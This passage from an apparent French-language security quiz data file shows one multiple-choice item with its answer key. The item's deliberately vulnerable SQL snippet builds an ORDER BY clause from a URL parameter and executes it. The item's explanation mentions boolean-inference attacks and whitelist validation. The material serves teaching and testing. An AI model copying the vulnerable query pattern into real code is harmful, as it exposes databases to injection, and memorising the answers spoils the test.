    ['sql', 'injection', 'cwe-89']),
  S('s2-sql-orderby', 'software', 'intermediate', 'Colonne de tri injectable', 'sql',
    `-- @sort provient de ?sort= dans l'URL
SET @q = 'SELECT id, name FROM products ORDER BY ' + @sort;
EXEC(@q);   -- <-- ici`,
    'Quelle est la vulnérabilité ?',
    ['Injection SQL via la clause ORDER BY non paramétrable',
     'Fuite de données par tri sur une colonne cachée',
     'Déni de service par tri sur une table volumineuse',
     'Divulgation du plan d\'exécution de la requête'],
    'ORDER BY n\'accepte pas de paramètre lié ; `@sort = (CASE WHEN ...)` permet des attaques par inférence booléenne. Valider @sort contre une liste blanche de colonnes. CWE-89.',
    ['sql', 'injection', 'cwe-89']),
];
